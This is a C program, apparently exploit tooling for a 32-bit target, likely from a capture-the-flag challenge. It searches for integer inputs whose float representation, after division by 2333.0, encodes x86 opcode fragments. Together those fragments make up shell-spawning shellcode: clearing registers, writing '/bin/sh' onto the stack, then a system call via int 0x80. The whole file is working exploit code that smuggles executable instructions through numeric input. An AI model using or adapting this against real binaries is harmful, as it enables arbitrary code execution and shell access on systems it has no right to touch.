/* compile with:
 * gcc -m32 -o gen_numbers -Wall -O2 gen_numbers.c
 * -m32 is needed because the target binary is also 32-bit and float numbers
 *  are not the same between a 32-bit binary and a 64-bit one
 */

#include <stdlib.h>
#include <stdio.h>

int main(void) {

  unsigned int i;
  unsigned int o;
  float v;
  float *pf;
  int *pi;
  int temp;
  int got;

  char *instructions[] = {
    "xor eax, eax; inc eax ~> 31c040",
    "inc eax; inc eax ~> 4040",
    "inc ebx; ~> 43",
    "dec ebx; dec ebx ~> 4b4b",
    "xor ecx, ecx ~> 31c9",
    "xor edx, edx ~> 31d2",
    "int 0x80 ~> cd80",
    "mov ebx, esp ~> 89e3",
    "dec ebx, dec ebx ~> 4b4b",
    "mov byte ptr [ebx], 0x2f ~> c6032f /",
    "mov byte ptr [ebx], 0x62 ~> c60362 b",
    "mov byte ptr [ebx], 0x69 ~> c60369 i",
    "mov byte ptr [ebx], 0x6e ~> c6036e n",
    "mov byte ptr [ebx], 0x73 ~> c60373 s",
    "mov byte ptr [ebx], 0x68 ~> c60368 h",
    "mov byte ptr [ebx], 0x00 ~> c60300 \\0"
  };
  int opcodes[] = {
    0x40c031,
    0x4040,
    /* add a dummy 46 */
    0x4643,
    0x4b4b,
    0xc931,
    0xd231,
    0x80cd,
    0xe389,
    0x4b4b, 
    0x2f03c6,
    0x6203c6,
    0x6903c6, 
    0x6e03c6,
    0x7303c6,
    0x6803c6,
    /* need to cheat for the test */
    0x10003c6
  };
  size_t size = sizeof(opcodes) / sizeof(opcodes[0]);

  /* dark pointer magic
   * the idea is to have a look at the float value from an integer prespective
   * to have an easy way to manipulate and compare it.
   */
  pf = &v;
  pi = (int *)pf;

  got = 0;
  for (i = 0; (got < size) && (i < 0xffffffff); i++) {
    temp = i;
    v = ((float)temp) / 2333.0;
    for ( o = 0; o < size; o++ ) {
      if ( opcodes[o] ) {
        /* separate both cases for a little more clarity... */
        if ( opcodes[o] < 0x10000 ) {
          /*
           * most significant byte is  either 0x46 or 0x47
           * case 1: next is either 0x46, 0x47 or 0x90
           *         two lowest significant byte are the opcode
           * case 2: next is the opcode
           *         least significant byte is either 0x46, 0x47 or 0x90
           */
          if ( (((*pi >> 24) == 0x46) || ((*pi >> 24) == 0x47))
              /* case 1 */
              && (((((*pi >> 16 & 0xff) == 0x46) || ((*pi >> 16 & 0xff) == 0x47)
                  || ((*pi >> 16 & 0xff) == 0x90)) && ((*pi & 0xffff) == opcodes[o]))
              /* case 2 */
                || ((((*pi & 0xff) == 0x46) || ((*pi & 0xff) == 0x47)
                    || ((*pi & 0xff) == 0x90)) && ((*pi & 0xffff00) == opcodes[o]))) ) {
            printf("%d => 0x%08x : %s\n", temp, *pi, instructions[o]);
            opcodes[o] = 0;
            got++;
          }
        } else {
          /* because of the cheat we have to mask it */
          if ( ((*pi) == ((opcodes[o] & 0xffffff) | 0x47000000))
              || ((*pi) == ((opcodes[o] & 0xffffff) | 0x46000000)) ) {
            printf("%d => 0x%08x : %s\n", temp, *pi, instructions[o]);
            opcodes[o] = 0;
            got++;
          }
        }
      }
    }
  }
  exit(0);
}